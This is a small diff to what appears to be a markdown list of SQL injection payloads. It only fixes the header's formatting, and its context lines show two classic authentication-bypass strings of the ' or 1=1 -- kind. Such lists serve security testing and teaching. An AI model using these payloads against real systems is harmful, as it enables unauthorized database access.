@@ -1,4 +1,4 @@
-#General sql injection payload list
+# General sql injection payload list
 ```sql
 ' or 1=1 --'
 ' or 1=1 -'
